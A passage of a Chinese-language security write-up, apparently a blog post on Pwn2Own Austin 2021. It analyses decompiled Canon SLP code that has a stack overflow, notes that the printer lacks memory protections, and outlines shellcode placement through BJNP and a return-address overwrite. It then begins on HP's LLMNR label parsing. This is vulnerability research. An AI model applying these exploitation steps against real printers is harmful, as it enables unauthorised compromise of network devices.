          &lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1F&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7F&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;(),&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;!&amp;lt;=&amp;gt;~;*+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-----------------------[3]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1F&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7F&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos; &apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_35&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_35:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//----------------------[4] &lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next_one&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;LOBYTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_40:&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;next_one:&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;debugprintff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3645&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Scope longer than buffer provided&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_48:&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdata&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdatalen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以看到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[3]&lt;/code&gt; 針對是沒有跳脫字元的處理，會在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[4]&lt;/code&gt; 檢查是否有超過最大長度，然而在有跳脫字元的處理中 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[1]&lt;/code&gt; ，並沒有任何對長度的檢查，直接將轉換後的結果放到 destination buffer 中 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[2]&lt;/code&gt;，一旦給定的字串多數為跳脫字元的情況，就會造成 stack overflow。&lt;/p&gt;

&lt;p&gt;在找到漏洞之後，第一件事就是先看看本身有甚麼保護，方便後續的利用。但分析了一下發現，Canon 印表機本身並沒有任何記憶體相關的保護。&lt;/p&gt;

&lt;h4 id=&quot;protection&quot;&gt;Protection&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;No Stack Guard&lt;/li&gt;
  &lt;li&gt;No DEP&lt;/li&gt;
  &lt;li&gt;No ASLR&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;沒有 Stack Guard、沒有 DEP 也沒有 ASLR，可以說是 &lt;strong&gt;hacker friendly&lt;/strong&gt; ! 如同回到 90 年代，一個 stack overflow 就可以打天下。接下來就如同過往的 Binary Exploitation 利用手法，找個地方放 shellcode 再覆蓋 return address 跳到 shellcode 就會有任意程式碼執行了! 最終我們找到了 BJNP 這個服務來放我們的 shellcode。&lt;/p&gt;

&lt;h4 id=&quot;bjnp&quot;&gt;BJNP&lt;/h4&gt;
&lt;p&gt;BJNP 本身也是個服務發現協定，由 Canon 自己所設計，過去也曾經有許多漏洞，&lt;a href=&quot;https://www.synacktiv.com/publications/treasure-chest-party-quest-from-doom-to-exploit.html&quot;&gt;Synacktiv&lt;/a&gt; 也曾經利用該協定漏洞來獲得印表機控制權，這邊不多做細節上的介紹，更多細節可參考&lt;a href=&quot;https://doar-e.github.io/blog/2022/06/11/pwn2own-2021-canon-imageclass-mf644cdw-writeup/#bjnp&quot;&gt;這篇&lt;/a&gt;，我們也用了類似的手法。 BJNP 本身會將可控的 session 資料放在已知的 global buffer 中，我們可用這個功能來將我們的 shellcode 放到一個固定的位置上，基本上也沒甚麼限制。&lt;/p&gt;

&lt;p&gt;我們重新整理一下利用步驟&lt;/p&gt;

&lt;h4 id=&quot;exploitation-step&quot;&gt;Exploitation Step&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;使用 BJNP 將我們的 shellcode 放到固定的已知位置。&lt;/li&gt;
  &lt;li&gt;觸發 SLP 的 stack overflow 並覆蓋 return address&lt;/li&gt;
  &lt;li&gt;跳到我們的 shellcode 上執行程式碼。&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;pwn2own-austin-2021-1&quot;&gt;Pwn2Own Austin 2021&lt;/h4&gt;
&lt;p&gt;通常 Pwn2Own 中會需要你證明已打下印表機，這邊可以自由選擇呈現方式，我們起初想要的是如同我們 exploit Lexmark 印表機一樣，直接將 logo 放到印表機的 LCD 螢幕上。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/16.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;但在比賽前，我們花了很多時間在研究該怎麼把 logo 印到螢幕上，花在這邊時間可能比找洞跟寫 exploit 時間還要長，最後也因為時間上的因素，採取了比較保險的做法，直接改掉 &lt;a href=&quot;https://doar-e.github.io/blog/2022/06/11/pwn2own-2021-canon-imageclass-mf644cdw-writeup/#service-mode&quot;&gt;Service Mode&lt;/a&gt; 字串，再印到螢幕上。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/17.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;不過實際上印圖片到螢幕上並不難，其他隊伍有找到&lt;a href=&quot;https://doar-e.github.io/blog/2022/06/11/pwn2own-2021-canon-imageclass-mf644cdw-writeup/#displaying-an-image&quot;&gt;方法&lt;/a&gt;，有興趣的人可以嘗試看看。&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/vQbQImZ3XRw?start=18400&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h4 id=&quot;debug&quot;&gt;Debug&lt;/h4&gt;
&lt;p&gt;看到這邊可能會有人想問這種環境如何 debug，實際上來說要 debug 通常有幾種方法：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;接上硬體獲得 debug console 後，用裡面的功能來 debug&lt;/li&gt;
  &lt;li&gt;用舊的洞獲得程式碼執行後，裝上客製的 debugger&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;不過我們當時已更新到最新，該版本不存在舊的漏洞，需要降版本回去，而拆解硬體同樣也須額外的時間，但當時我們已經有漏洞了，時間上來說不太合成本。最後我們還是採用最傳統的 sleep debug 法去 debug。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/18.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在 ROP 或執行 shellcode 後，將結果印到網頁或其他可見的地方，然後呼叫 sleep 後，就可從網頁或其他讀出結果，最後再重開機，接下來就是不斷重複此流程。不過實際上更好的做法還是接上 debug console 會方便一點。&lt;/p&gt;

&lt;p&gt;接下來講講 HP 印表機&lt;/p&gt;

&lt;h3 id=&quot;hp-1&quot;&gt;HP&lt;/h3&gt;

&lt;h4 id=&quot;link-local-multicast-name-resolution&quot;&gt;Link-Local Multicast Name Resolution&lt;/h4&gt;
&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution&quot;&gt;LLMNR&lt;/a&gt; 是與 mDNS 非常相似的一個協定，提供了區網中的域名解析功能，但比 mDNS 更單純一點，通常也會配合一些服務發現協定。這邊簡單介紹此機制：&lt;/p&gt;

&lt;p&gt;在區網域名解析時，Client A 會先用 multicast 方式，尋找區網中 Client C 位置
&lt;img src=&quot;/assets/img/blog/20231005/19.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在 Client C 接收到之後，則會回傳給 Client A，簡單實現了區網域名的解析
&lt;img src=&quot;/assets/img/blog/20231005/20.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;而基本上 LLMNR 大多建立在 &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc4795#section-2.1.1&quot;&gt;DNS 封包格式&lt;/a&gt; 上，格式如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/21.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;主要會是 header 加上 Queries 這種格式，Count 表示不同型態的 query 數。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/22.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;而每個 DNS Query 都是由許多 label 組成，每個 label 都會像上圖中這樣，都是長度加上字串的組合，也有 &lt;a href=&quot;https://www.rfc-editor.org/rfc/rfc1035#section-4.1.4&quot;&gt;Message Compression&lt;/a&gt; 機制，過去在處理這些地方時，非常容易出現問題，在 BlackHat 2021 的 &lt;a href=&quot;https://i.blackhat.com/asia-21/Thursday-Handouts/as-21-dosSantos-The-Cost-of-Complexity-Different-Vulnerabilities-While-Implementing-the-Same-RFC.pdf&quot;&gt;THE COST OF COMPLEXITY:Different Vulnerabilities While Implementing the Same RFC&lt;/a&gt; 中，也提到了類似的問題。&lt;/p&gt;

&lt;h4 id=&quot;vulnerability-1&quot;&gt;Vulnerability&lt;/h4&gt;

&lt;p&gt;我們回頭來看一下 HP 的實作：&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;llmnr_process_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(...){&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;292&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;consume_labels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;llmnr_packet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;qname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,...);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;這邊可以看到 HP 在處理 LLMNR 封包時，會將一個固定 buffer 傳入，用來放處理後的結果，而 consume_lables 則是主要用來處理 dns labels。&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;consume_labels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;llmnr_hdr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r12&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r3&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r4&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r6&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// cc&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r6&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;chr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-------------[1]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chr&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xC0u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
